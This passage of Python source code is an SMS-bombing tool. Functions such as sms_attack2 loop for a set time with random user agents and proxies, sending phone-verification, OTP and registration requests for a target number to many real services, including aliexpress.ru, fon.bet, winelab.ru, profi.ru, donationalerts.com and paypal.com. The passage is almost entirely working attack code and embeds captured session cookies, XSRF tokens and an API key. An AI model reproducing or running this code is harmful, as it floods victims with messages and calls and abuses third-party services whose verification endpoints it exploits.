aid=eyJpdiI6InBvZnl6VVp2WWhMSUdGTXBpSEJZeHc9PSIsInZhbHVlIjoia0ZQSTd0RFwvTVRWV3I0M2ZyamZxN3N2R3d2Vmg2S0V4bGJBRWFlckY5YkZ4V0srWWhybzRDM3JYaVRQa0cwNzVsUWllSkZhSHhEWXE0bzlGQUxqc2p3PT0iLCJtYWMiOiIyYjUxOWEyYjU5MzAwNDcyMTRiMmQ3NmIzMWE1YjJkNzgyNzg0NGM5MDRlNzgxOWM4NGI1MWQ4OTdhZjYyZDJmIn0%3D',
                'origin': 'https://www.vprok.ru',
                'referer': 'https://www.vprok.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-xsrf-token': 'eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9'
            }

            payload = {
                'phone': number
            }

            requests.post('https://www.vprok.ru/as_send_pin', data=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '402',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'JSESSIONID=43513EF03AC09ED7D6F2351E9E0F002C; JSESSIONID=43513EF03AC09ED7D6F2351E9E0F002C; pickupCity=true; cityCode=spb; lemurrr-cart=1b4bf0de-c776-4610-8307-6673951f2d1b',
                'Host': 'lemurrr.ru',
                'Origin': 'https://lemurrr.ru',
                'Referer': 'https://lemurrr.ru/registration-card',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            payload = {
                'step': '1',
                'pets': '',
                'phone': num2,
                'token': '',
                'lastName': '',
                'firstName': '',
                'patronymic': '',
                'email': '',
                'titleCode': '',
                'birthdayDate': '',
                'birthdayDateDate': '',
                'cityCode': '',
                'cityName': '',
                'password': '',
                'confirmPassword': '',
                'newsletterAgreement': 'on',
                'smsMarketing': 'on',
                'emailMarketing': 'on',
                'line1': '',
                'flat': '',
                'stage': '',
                'namePet': '',
                'typePet': '',
                'breedPet': '',
                'weightPet': '',
                'birthdayPet': '',
                'birthdayPetDate': '',
                'bonusCardsNumber': '',
                'promotionCode': '',
                'CSRFToken': '2b3c6379-ff43-46a9-9dac-3a4f5a47496a'
            }

            requests.post('https://lemurrr.ru/registration-card/registration', data=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'bx-ua': '223!gh1CQA7Uc0ygGCgyJgK6iAHGrOWIMRBFt/tSL2VflLyjURyfSAYWaNhzZ95z2R+pryd0mbOC7/c1cga4LfX7XlwWw2+karoQjp/SCpOICavupeAvlw3Yy5GTQo0KzMsE5gyObUT/PCRycK4je194rjR1zJi/+6R4cKwGmn3RaHjTES8RSc/r1h8Mg2g3SrFvUAgg6EHWaEp9ijjS1r/SaR62XLg3S0gLEKipm8G/rQoecXLtU6i1MQo0z7vgtjL1AxjId+pRoIHzcf2rb0W4rQQ4zJz7ud56XgQTWGT/rWRygKaOe1IJcQQciJi/+6R4ceGacMm62wcMtIZP0ae0syeRLq3yrHm6rjZbA01TELk9xDSwzAlUl+sZuoEnrdhdlCxm2J43CPnqyhMSYvhU6Rx6mFwJISQoLGC7GJa/VgU0mugORkcGGMMGvGtPqmXeHsr83LYmjDiwKT0N7g+gFX9B7yIO3UKsfuXOVZtSZNh9QV8V1/M7kLafyDO+RDKlwrAbE4Uynp04gSMaAe4qTleNGFb2JTZYyOZy7YXY2fwrtV8ebXA6aflY94zpxmMN9Skfo79ZGZyHR4axw4Hhjb5pErIcM4vwFdshQpA+ruQad3Xaf9HWT5VWC5y6NR9bHwdx/HyENxF9ypXfq8Kb0KHa9KmdFwoseb+u3lIajmWqCtC75eqbYzON+OrZA3tPgT3fgZpF11XupM34i/JhzRrpWmBCg1LRBBk7KJ+udhebbAQJPeLoFnYqMw9BTo9x047r6Hu3LwkzUAkAVpFjv2wlcqPJCd4DI2GIwGiE0wWTUN6CFajoaB5zPV6pxw+ml9nZsqHaE/MOzpMOwxTV8rez0ef7+SN2xHrqV0e/QZy0o0QMzLSQL5tfvyTnbTiIqx+SCkr7YRNjoVCF6UcmQdbNyLpa5iEh26Yvt+RzyTRAULLJInG0Sx0G6OMXyjgdh5iL7bYMbH39fs+a5SxinuHU79yw+avvgqmTX05O7H5be79kOI81wXyn3xeVdB8WTk3g7swleat2Ba60fgMRHw7zDX7wo64UvUi3JePTPL3uE1M6mVIp+6i/v7AumhnxkLX/Zw+IFuGuglg5ej==',
                'bx-umidtoken': 'T2gA0nhci5HWcevH5zd0EH7BnRRtyUvshrLt2l1oigEmKAnY8JyzLPnVAAMMxPspizI=',
                'content-length': '1561',
                'content-type': 'text/plain;charset=UTF-8',
                'cookie': 'aer_abid=e7837ca8509e6c9a; acs_usuc_t=x_csrf=3gi48phl5j_s&acs_rt=7122813d0f5b49338fcecc4affd772da; xman_t=RYU45Rw/P4JNJF84NKgT4dq70sIp4TguFPGJj8BZOhkRd0TBje5c2RaODRkrwPhT; xman_f=5un0UFmYvrNgACLBAum4oWM8RAUqunUYiCgw4FGrjNzKARmwUxko2lpQqldFKK5Of1fWk0gHOItRELxCz/Cp/nIE6bPX4/Fo3fBI1z596wNChx5//UL6WQ==; xman_us_f=x_locale=ru_RU&x_l=0&x_c_chg=1&acs_rt=50c77cefad7a4021b41f0f6f2a9ced49; intl_locale=ru_RU; aep_usuc_f=site=rus&c_tp=RUB&region=RU&b_locale=ru_RU; xlly_s=1; intl_common_forever=UYSq6AZOhhaI4ZOz9j5s1/mt5Mkg2bUOF+BzgAF3t937OTKSMIfdaw==; JSESSIONID=44828D31960F5FA579B40154BB4ABEEC; tfstk=cl3CB9geNY3ayZYl-JOwU_f7xbahZx5bNHwnOptNgV0hxclCiSb4hNIrqTUzw51..; l=eBM9vtwITHaZfir8BO5ahurza77TmCOfcsPzaNbMiInca6nOaFiMWNCUvWrpudtjQt5jeEtyLtAZndny8SU3Wtw7VXuPMUGlifppRe1..; isg=BCUlHVXRqkixJ84UtWrpsDHoNOdfYtn0gFsUSCcP6txrPk2w47MwxZUYyLpIPvGs',
                'origin': 'https://aliexpress.ru',
                'referer': 'https://aliexpress.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-aer-cna': '-'
            }

            payload = {"phone": "7-"+number[1:], "locale":"ru_RU","currency":"RUB","returnURL":"https://aliexpress.ru/","channel":"CALL","environment":{"uaEncrpt":"223!gh1CQA7Uc0ygGCgyJgK6iAHGrOWIMRBFt/tSL2VflLyjURyfSAYWaNhzZ95z2R+pryd0mbOC7/c1cga4LfX7XlwWw2+karoQjp/SCpOICavupeAvlw3Yy5GTQo0KzMsE5gyObUT/PCRycK4je194rjR1zJi/+6R4cKwGmn3RaHjTES8RSc/r1h8Mg2g3SrFvUAgg6EHWaEp9ijjS1r/SaR62XLg3S0gLEKipm8G/rQoecXLtU6i1MQo0z7vgtjL1AxjId+pRoIHzcf2rb0W4rQQ4zJz7ud56XgQTWGT/rWRygKaOe1IJcQQciJi/+6R4ceGacMm62wcMtIZP0ae0syeRLq3yrHm6rjZbA01TELk9xDSwzAlUl+sZuoEnrdhdlCxm2J43CPnqyhMSYvhU6Rx6mFwJISQoLGC7GJa/VgU0mugORkcGGMMGvGtPqmXeHsr83LYmjDiwKT0N7g+gFX9B7yIO3UKsfuXOVZtSZNh9QV8V1/M7kLafyDO+RDKlwrAbE4Uynp04gSMaAe4qTleNGFb2JTZYyOZy7YXY2fwrtV8ebXA6aflY94zpxmMN9Skfo79ZGZyHR4axw4Hhjb5pErIcM4vwFdshQpA+ruQad3Xaf9HWT5VWC5y6NR9bHwdx/HyENxF9ypXfq8Kb0KHa9KmdFwoseb+u3lIajmWqCtC75eqbYzON+OrZA3tPgT3fgZpF11XupM34i/JhzRrpWmBCg1LRBBk7KJ+udhebbAQJPeLoFnYqMw9BTo9x047r6Hu3LwkzUAkAVpFjv2wlcqPJCd4DI2GIwGiE0wWTUN6CFajoaB5zPV6pxw+ml9nZsqHaE/MOzpMOwxTV8rez0ef7+SN2xHrqV0e/QZy0o0QMzLSQL5tfvyTnbTiIqx+SCkr7YRNjoVCF6UcmQdbNyLpa5iEh26Yvt+RzyTRAULLJInG0Sx0G6OMXyjgdh5iL7bYMbH39fs+a5SxinuHU79yw+avvgqmTX05O7H5be79kOI81wXyn3xeVdB8WTk3g7swleat2Ba60fgMRHw7zDX7wo64UvUi3JePTPL3uE1M6mVIp+6i/v7AumhnxkLX/Zw+IFuGuglg5ej==","umidToken":"T2gA0nhci5HWcevH5zd0EH7BnRRtyUvshrLt2l1oigEmKAnY8JyzLPnVAAMMxPspizI=","regSrc":"AE_MAIN_LOGIN","securityTimestamp":1668031201204,"refer":"https://aliexpress.ru/","userAgent":user}}

            requests.post('https://aliexpress.ru/aer-api/v2/bx/auth/v1/web/register/phone/init?_bx-v=2.0.52', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '407',
                'Content-Type': 'text/plain;charset=UTF-8',
                'Host': 'clientsapi03w.bk6bba-resources.com',
                'Origin': 'https://www.fon.bet',
                'Referer': 'https://www.fon.bet/account/registration/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': user
            }

            payload = {
                "advertInfo": "",
                "birthday": "2000-10-25",
                "deviceId": "2340BBFFD39BD54C3A914A90D5582A63",
                "ecupis": True,
                "email": "",
                "emailAdvertAccepted": True,
                "fio": "",
                "lang": "ru",
                "password": "Hoho_HO123",
                "phoneNumber": "+"+number,
                "platformInfo": user,
                "promoId": "",
                "sysId": 1,
                "webReferrer": "https://www.fon.bet/"
            }

            requests.post('https://clientsapi03w.bk6bba-resources.com/cps/superRegistration/createProcess', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '29',
                'content-type': 'application/json',
                'origin': 'https://www.myacuvue.acuvue.ru',
                'referer': 'https://www.myacuvue.acuvue.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user,
                'x-api-key': 'XoA3wMy3d8LNGDToaWz1yQdjRiKcjLWu',
                'x-app-version': 'PWA 2.3.1'
            }

            payload = {
                'phoneNumber': number
            }

            requests.post('https://api.myacuvuepro.ru/myacuvue/oauth/mobile', json=payload, headers=header)
        except:
            pass
        try:
            num = number
            num2 = ""
            num2 += "+"
            num2 += '7'
            num2 += ' '
            num2 += num[1]
            num2 += num[2]
            num2 += num[3]
            num2 += ' '
            num2 += num[4]
            num2 += num[5]
            num2 += num[6]
            num2 += '-'
            num2 += num[7]
            num2 += num[8]
            num2 += '-'
            num2 += num[9]
            num2 += num[10]

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'content-length': '96',
                'content-type': 'application/json',
                'cookie': '__ddg1_=yQBvT8ysH0tFlugWm0O9; carrotquest_device_guid=ace92f79-95eb-40a9-9b46-d06ef787dcb3; carrotquest_uid=1310692300824775160; carrotquest_auth_token=user.1310692300824775160.47112-01b222b73dc258e08f5f0e0bdc.57ce2ff07ad4234296e3a0e39d501b1fe0645cb1965dcca9; carrotquest_realtime_services_transport=wss; referral_sesid=1668354697.RqGoIa; carrotquest_session=8dvqbuyatub1foysktrtghhna4pd7v1f; carrotquest_session_started=1',
                'origin': 'https://firstvds.ru',
                'referer': 'https://firstvds.ru/',
                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-kl-ajax-request': 'Ajax_Request'
            }

            payload = {"phone_formated": num2, "auth": "6d122a698ceb27bd5be268f4", "type": "start",
                       "code": ""}

            requests.post('https://firstvds.ru/my/number_check', json=payload, headers=header)
        except:
            pass


def sms_attack2(number, time_a):
    t = time.monotonic()
    proxies = []

    with open('input/proxies.txt', 'r') as file:
        for line in file:
            proxies.append(line.replace('\n', ''))

    while time.monotonic() - t < time_a:
        user = ua.random
        proxy = random.choice(proxies)
        proxy_2 = {
            "http": "http://" + proxy,
            "https": "https://" + proxy
        }

        try:
            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:9]}-{number[9:]}"

            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Cookie': 'qrator_jsr=1667424883.450.WZCPaRenglZkPePI-le2oklkm6aealchhhqnor0ksad5pa0s4-00; qrator_jsid=1667424883.450.WZCPaRenglZkPePI-sgbkkeibpqb9vhtdjv53ptu59lrblf59; currentDeliveryMode=pickup; currentRegion=RU-MOW; currentPOS=C027; qrator_ssid=1667424884.336.vAWpAHFmUYrSKIL0-t6ndf70f5ulevfvnj4dea98eujk6bblt; dtCookie=v_4_srv_39_sn_4A026F2CA6150477AA79F3D3D29C365A_perc_100000_ol_0_mul_1_app-3Ab08f9e5bb12c9b66_1; anonymous-consents=%5B%7B%22templateCode%22%3A%22adpr%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22generic%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22marketing%22%2C%22templateVersion%22%3A1%2C%22consentState%22%3Anull%7D%5D; cookie-notification=NOT_ACCEPTED; JSESSIONID=9426f45a-1a18-4d99-abec-2ca10dcab1b3; rxVisitor=16674248997432H1LVL8LKQFJ1AC7U29NEJ065IC6TBK3; advcake_track_id=1a2167a0-b7b2-3dba-89cc-e4e3b3482257; advcake_session_id=2eecc76c-73c8-fa92-f834-af5579620a7c; age-confirmed=1; isNearestPos=false; dtSa=-; dtLatC=139; rxvt=1667426797286|1667424899744; dtPC=39$24921274_828h-vJTNEWOCKEKFPJUGCSVBMURFFGRNVUWUM-0e0',
                'Host': 'www.winelab.ru',
                'Referer': 'https://www.winelab.ru/login/register',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            requests.get(f'https://www.winelab.ru/login/send/confirmationcode?number={num2}&_=1667424921408',
                         headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = f"7 {number[1:4]}-{number[4:7]}-{number[7:9]}-{number[9:]}"

            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '2168',
                'content-type': 'application/json',
                'cookie': 'city=spb; site_version=desktop; first_hit_url=%2F; uid=8ABABAB98EEC626328515E670203D03D; sid=ubq6imNi7I5nXlEoPdADAg==; _gcl_au=1.1.1810282558.1667427483; _ga=GA1.2.648055991.1667427484; _gid=GA1.2.1544660882.1667427484; _gat_UA-51788549-1=1; tmr_lvid=10a4fa8a9fdf0837aa2f832f43e0c879; tmr_lvidTS=1667427483587; _ym_uid=1667427484751794767; _ym_d=1667427484; st_uid=aecf6f00f48400b66c1f81734929fecf; _ym_isad=2; advcake_track_id=49bca5f7-e704-1a53-a041-5e968b832d6e; advcake_session_id=ff6fe018-2736-375f-542e-f888f3e85acb; _tt_enable_cookie=1; _ttp=c729a64e-7d87-49df-b327-4af15846ef99; geo_city_confirmed=yes; prfr_tkn=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZnVsbCIsInZlcnNpb24iOjEsImlkIjoiZTQ5NmIxMjItYTBhNy00ZThjLTkwNDktNDcyZGZlNmUzMDdmIiwic3RhdHVzIjoidG91Y2hlZCIsInNlc3Npb25JZCI6IjE0OWFlMTRmLWIzOTItNGU4Ny04Zjk5LTVmYzg2YmE4MTY1YiIsImlhdCI6MTY2NzQyNzQ3MSwiZXhwIjoxNjY3NDI4MDcxLCJqdGkiOiJlNDk2YjEyMi1hMGE3LTRlOGMtOTA0OS00NzJkZmU2ZTMwN2YifQ.b4wuFVvFBpNvOpK413eU6ixLUYe6TlL3Vdgdz0Cf4-g; tmr_detect=0%7C1667427486358; ets=%2F%2C%2C1667427483; wtfId=1724712-1667427483.865-178.170.198.53-56020; _ga_FRVD1KH7N7=GS1.1.1667427483.1.1.1667427497.46.0.0; tmr_reqNum=4',
                'origin': 'https://spb.profi.ru',
                'referer': 'https://spb.profi.ru/cabinet/login/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-app-id': 'PROFI',
                'x-new-auth-compatible': '1',
                'x-requested-with': 'XMLHttpRequest',
                'x-wtf-id': '1724712-1667427470.069-178.170.198.53-56020'
            }

            payload = {
                "query": "#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}",
                "variables": {"type": "phone", "initialState": {"phoneNumber": num2, "defaultOrderCityId": "spb-prfr",
                                                                "currentHost": "https://spb.profi.ru"}}}

            requests.post('https://spb.profi.ru/graphql', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': '__ddg1_=Ugw1h8FzFgIdsoFRF8oF; PHPSESSID=bl2srubtrv1nplb0gd05a2729n; cguuid=1667495511_bl2srubtrv1nplb0gd05a2729n; chg_ref=https%3A%2F%2Fwww.google.com%2F; chg_req=https%3A%2F%2Fwww.chitai-gorod.ru%2F; cityId=213; cityName=%C3%EE%F0%EE%E4%20%CC%EE%F1%EA%E2%E0; countryId=643; countryName=%D0%EE%F1%F1%E8%FF; newsite=1; VisitorId=3ee9d4ec-5370-43ea-8217-af98e2de47cb; showed_action-banner-244=1',
                'origin': 'https://www.chitai-gorod.ru',
                'referer': 'https://www.chitai-gorod.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user
            }

            requests.get(
                f'https://webapi.chitai-gorod.ru/web/verify/phone/send?token=123&action=create&data%5Bphone%5D=%2B{number}&data%5Btype%5D=1',
                headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '78',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': 'partial_language=en_US; _fbp=fb.1.1667496668749.461913499; mr1lad=6363fac161afbe3b-300-100-; language=fr_FR; auth=eyJpdiI6Ik1MK2w3VUNxM3JqL3Zhb1p2aDNhU2c9PSIsInZhbHVlIjoiYXVRVHRYdUVZNXdqbkNGcWhBWW9ydXdBbmlzWmFZWjNCSUZ4YytPU0Z2UEEvRmxBMFZ5VGFhMkYyZkU4QmRYRCIsIm1hYyI6IjQ1ZTJiYWU4MDIyZDljOTFlNGViYzA0YzY2ZDcwOTliOTRkMDE1ZDAxYWVmMGRkNThmMDE4OTEzZjA5N2IzZDYiLCJ0YWciOiIifQ%3D%3D; PHPSESSID=a30citc5pten82bespfnhas1id; apid=297148026_47ac992f59a9435b6996d59673f31476; XSRF-TOKEN=eyJpdiI6Ild6NHRRcjc1d3hBTlRwNEMvd2VOaHc9PSIsInZhbHVlIjoiS1Q5ejlUWnJNalNsRGtNL0k5VmlQd01JcmlpczFjWndPY0JCSXA4dkY1dUd0WHRmSS9MR0M4eWJ0MHQ1bHBtMU54ei9rWFl0TGhZR2hUYlFmcDhqTk1LdEtuNnpxY3FzVm14OTB3N1EwZEtERW9Mbmc0bTFabXk5OU1KY3hVd0giLCJtYWMiOiJkZWI5Yjc1ZDc5N2ZmZWJlNjBjMzljZTZhZTI2Y2I0MDA0NTQ4NGJlNmMzYTA1N2VmZTQ0MmY0NzYwNmI2OTY4IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkxkUzczcXFuUG9EbkcxTUtVcHBINkE9PSIsInZhbHVlIjoidWlnOEJBVWNPUHluZzJuZzVEVmRKVERIMmxRdHJ3NzRsajViSlhLRTRpdGdQZlF3R0M2THhvQWREb3Z0NmV6K3RYZ2d6cmFjU1ltNFZLajhhVnhSb3R2QlFCZWhMMnYwSnV4L2pmaVF4c2hmcEZ2R050a21HVGZURUtiMG14c3ciLCJtYWMiOiI3NzY0MDZlOGVjYmRiMmQ3ZDNiY2NiODYwMjA2MGZiOTlhZTQxMTQxYWFkNGYyZmQzN2QwMGQzOWI5YThhM2FiIiwidGFnIjoiIn0%3D; cookies_warning=1',
                'origin': 'https://www.donationalerts.com',
                'referer': 'https://www.donationalerts.com/dashboard/general-settings',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'data': f'phone_number=%2B{number}&tf_signature=',
                'form': 'two_factor_connect'
            }

            requests.post('https://www.donationalerts.com/ajax/twofactor/connect', data=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'content-length': '88',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'dnt': '1',
                'origin': 'https://widget.verifykit.com',
                'referer': 'https://widget.verifykit.com/v2.1/?token=dma6839823b8e9ceeb7ba5e4d7987db521f71d5f12ff44b2372da1deac246&lang=ru',
                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }

            payload = {
                'countryCode': 'RU',
                'isMobileBrowser': '0',
                'phoneOperatingSystem': 'android',
                'phoneNumber': '+' + number
            }

            requests.post(
                'https://widget.verifykit.com/v2.1/otp-start?token=dma6839823b8e9ceeb7ba5e4d7987db521f71d5f12ff44b2372da1deac246',
                data=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '23',
                'Content-Type': 'application/json',
                'Cookie': 'city_auto_popup_shown=1; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; ccart=off; auid=70bba744-aa2a-47c9-aa2e-fcc429e8b30e:1oqeEy:5gdON_o33Prcb_-QzdVY-fFJmZDtA4P1zgyTPlEaZzs',
                'Host': 'api.sunlight.net',
                'Origin': 'https://sunlight.net',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {
                "phone": number
            }

            requests.post('https://api.sunlight.net/v3/customers/authorization/', json=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '491',
                'content-type': 'application/json;charset=UTF-8',
                'cookie': 'cookie_check=yes; l7_az=dcg13.slc; ts_c=vr%3D3e99499a1840a7a85b13e8eefea07218%26vt%3D3e99499a1840a7a85b13e8eefea07217; cookie_prefs=T%3D0%2CP%3D0%2CF%3D0%2Ctype%3Dexplicit_banner; TLTSID=13181915649569552210254340983466; KHcl0EuY7AKSMgfvHl7J5E7hPtK=V1UVv_rCpouveOJaC68dtRfVkQIfTjOas2fZ6RcFKZK7VfUBI5XEkaev-A1pe11eavhzg7eXC79A0ilK; ddi=DSVyKWWybP-200lx8MsKHE1l2UDCih_iD04O2K7I5WAHk5OV-G116VOmsvJmwFLdkg8yS_1NASNzKK37eNI0YKTprEiFCdtR844oT4szEkoEzci6; LANG=fr_XC%3BKZ; nsid=s%3A8P1aDLhmKkjuM6jrcJB0Q8hs7aSwUv2b.j9ne4A63KYkazQsLGO3LtCWaEiWtTXsxGfE7RP2ChZc; tsrce=authchallengenodeweb; x-pp-s=eyJ0IjoiMTY2NzQ5NzU2NDQyNSIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1762195564%26vteXpYrS%3D1667499364%26vr%3D3e99499a1840a7a85b13e8eefea07218%26vt%3D3e99499a1840a7a85b13e8eefea07217%26vtyp%3Dnew; tcs=main%3Aonbrd%3Asignup%3Aorganic%7CpaypalAccountData_submit',
                'origin': 'https://www.paypal.com',
                'referer': 'https://www.paypal.com/kz/welcome/signup/',
